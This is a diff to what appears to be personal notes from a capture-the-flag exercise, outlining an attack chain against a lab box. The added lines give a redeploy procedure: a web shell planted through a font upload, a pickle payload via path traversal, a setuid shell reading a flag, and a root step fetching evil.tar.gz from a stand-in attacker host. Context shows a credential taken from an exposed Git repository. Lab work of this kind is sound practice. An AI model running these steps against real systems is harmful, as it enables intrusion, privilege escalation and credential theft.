@@ -13,7 +13,18 @@
 - On first box instance, cron ran ~50 min after boot
 - On current box, files still in /files/ after extended wait
 - Cron schedule is unknown (personal crontab, unreadable)
+- Box keeps despawning (3rd instance now)
 - Possible long interval (hourly?) or condition-based trigger
+- NEED: either wait longer on a stable instance, or find a way to trigger manually
+
+## Rapid redeploy procedure (for next box spawn)
+1. Update /etc/hosts with new IP
+2. Upload shell font + designspace → cmd.php on portal (30 sec)
+3. Create raw protocol-0 pickle SFD file (NOT hex-encoded!)
+4. Upload SFD as variabype_rawpickle.ttf via master filename path traversal
+5. Wait for steve's cron OR find manual trigger
+6. /tmp/sb -p -c 'cat /home/steve/user.txt'
+7. Root: sudo /opt/font-tools/install_validator.py http://ATTACKER:8000/evil.tar.gz
 
 ## Attack Chain (completed)
 1. Git dump on portal (.git exposed) → `gitbot:G1tB0t_Acc3ss_2025!`
